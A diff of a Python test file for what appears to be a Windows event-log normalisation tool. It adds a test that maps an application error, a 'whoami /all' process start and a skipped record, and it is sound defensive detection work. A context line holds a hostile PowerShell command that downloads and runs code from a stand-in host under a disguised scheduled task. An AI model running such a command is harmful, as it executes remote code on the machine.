@@ -247,3 +247,18 @@ def test_windows_mapping_of_new_event_ids() -> None:
     assert task.command_line == "powershell.exe -w hidden -nop -c iex(iwr http://cdn-update.test/a)"
     assert task.raw["task_name"] == "\\EdgeUpdateCore"
     assert logon.raw["logon_type"] == "3"
+
+
+def test_windows_capture_all_keeps_unmapped_events_as_system_log() -> None:
+    base = {"TimeCreated": _at(1), "Computer": "FIN-WS-014", "LogName": "Application", "Channel": "Application"}
+    records = [
+        {**base, "EventID": 1000, "ProviderName": "Application Error", "Level": "Error", "Message": "Faulting application name: app.exe", "Capture": "all", "EventData": {}},
+        {**base, "EventID": 4688, "LogName": "Security", "Channel": "Security", "Capture": "all",
+         "EventData": {"SubjectUserName": "b.chen", "SubjectDomainName": "CORP", "NewProcessName": r"C:\Windows\System32\whoami.exe", "CommandLine": "whoami /all"}},
+        {**base, "EventID": 1000, "Message": "not full capture", "EventData": {}},
+    ]  # fmt: skip
+    events, skipped = map_records("windows-event", records)
+    log, proc = events
+    assert (log.event_type, log.process_name, log.message, log.raw["level"]) == ("system.log", "Application Error", "Faulting application name: app.exe", "Error")
+    assert proc.event_type == "process.start" and proc.command_line == "whoami /all"
+    assert skipped == 1
